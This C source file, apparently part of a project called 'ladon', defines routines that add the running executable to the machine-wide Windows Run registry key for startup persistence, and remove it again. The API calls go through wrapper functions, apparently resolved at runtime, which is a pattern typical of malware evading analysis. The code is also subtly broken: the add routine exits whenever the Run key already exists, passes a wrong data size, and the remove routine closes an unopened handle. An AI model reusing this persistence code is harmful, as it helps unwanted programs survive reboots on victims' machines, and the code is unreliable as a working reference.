#include "ladon.h"

BOOL AddToRegistry(LPCWSTR registry) {
	wchar_t currentpath[MAX_PATH];
	HKEY startup = NULL;
	DWORD disp = 0;

	_GetModuleFileNameW(NULL, currentpath, MAX_PATH);
	_RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &startup, &disp);
	if (disp == REG_OPENED_EXISTING_KEY) {
		_RegCloseKey(startup);
		return FALSE;
	}
	else {
		_RegSetValueExW(startup, registry, 0, REG_SZ, (LPBYTE)currentpath, sizeof(currentpath));
		_RegCloseKey(startup);
		return TRUE;
	}
	//	wprintf(L"worked! the current path is : %s", currentpath);
}

BOOL RemoveRegistry(LPCWSTR registry) {
	HKEY hkey = NULL;
	_RegDeleteKeyValueW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry);
	_RegCloseKey(hkey);
	return TRUE;
}